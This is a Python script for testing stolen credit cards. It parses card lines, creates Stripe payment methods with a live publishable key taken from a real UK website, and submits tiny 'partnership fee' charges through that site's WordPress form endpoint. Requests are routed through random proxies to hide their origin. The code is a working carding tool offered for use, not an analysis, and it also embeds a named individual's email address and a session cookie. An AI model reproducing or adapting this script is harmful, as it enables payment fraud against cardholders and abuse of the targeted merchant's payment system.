import requests
import random

def get_proxy():
    """
    Load a proxy from proxies.txt in the format username:password@host:port
    and format it for requests.
    """
    try:
        with open("proxies.txt", "r") as f:
            proxies = f.readlines()
        # Choose a random proxy
        proxy = random.choice(proxies).strip()
        username, password_host = proxy.split(":", 1)
        password, host_port = password_host.split("@", 1)
        host, port = host_port.split(":")
        
        # Format the proxy for requests
        proxy_auth = f"{username}:{password}@{host}:{port}"
        return {
            "http": f"http://{proxy_auth}",
            "https": f"http://{proxy_auth}",
        }
    except Exception as e:
        print(f"Error reading proxies: {e}")
        return None

def get_current_ip(proxy):
    """
    Fetch the current IP address using api.ipify.org.
    Optionally pass a proxy for the request.
    """
    try:
        response = requests.get("https://api.ipify.org?format=json", proxies=proxy, timeout=5)
        response.raise_for_status()
        return response.json().get("ip")
    except Exception as e:
        print(f"Error fetching IP: {e}")
        return None

def Tele(ccx, proxy):
    """
    Send credit card information to the Stripe API and process the payment.
    """
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    if "20" in yy:  # Ensure the year format is correct (e.g., 2024 -> 24)
        yy = yy.split("20")[1]

    r = requests.session()

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=a9eff41d-37b2-4a15-8fb2-eb82de025ee0cdd70f&muid=daf9d98c-74a8-4eab-8ab6-fb1d16f5eafdd2f029&sid=e246c354-2f76-4cb3-8185-b15617983beff8dfdf&payment_user_agent=stripe.js%2F37ee740de7%3B+stripe-js-v3%2F37ee740de7%3B+card-element&referrer=https%3A%2F%2Fwww.tilcareer.co.uk&time_on_page=37627&key=pk_live_51NziTtLlsEDB1rpsX9r2LfRJc2aCSXknSAgNSqeLVCxhpgk2WvHsWUgVm0YN0dSW2HbLlKhPQEQvbk18EUvbthzq00pCCOU6Ky'

    try:
        # Pass the proxy to the request
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxy)
        pm = r1.json().get('id')  # Assuming the 'id' is returned from the response
    except requests.RequestException as e:
        return f"Error while contacting Stripe API: {e}"

    if not pm:
        return {"error": "Failed to retrieve payment method ID"}

    cookies = {
        'PHPSESSID': 'd8cb2717d9fcffb85ea829f60b47e615',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.tilcareer.co.uk',
        'Referer': 'https://www.tilcareer.co.uk/payment-portal/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    params = {
        't': '1731646887931',
    }

    data = {
        'data': f'__fluent_form_embded_post_id=11040&_fluentform_15_fluentformnonce=f57b15a14b&_wp_http_referer=%2Fpayment-portal%2F&names%5Bfirst_name%5D=Khant%20Ti&names%5Blast_name%5D=Kyi&email=tyikyi2552002%40gmail.com&dropdown=Partnership%20Fee&partnership_fee=0.3&payment_method=stripe&item__15__fluent_checkme_=&__stripe_payment_method_id={pm}',
        'action': 'fluentform_submit',
        'form_id': '15',
    }

    try:
        r2 = requests.post(
            'https://www.tilcareer.co.uk/wp-admin/admin-ajax.php',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=proxy
        )
        current_ip = get_current_ip(proxy)
        return r2.json(), current_ip
    except requests.RequestException as e:
        return f"Error contacting final API: {e}", None
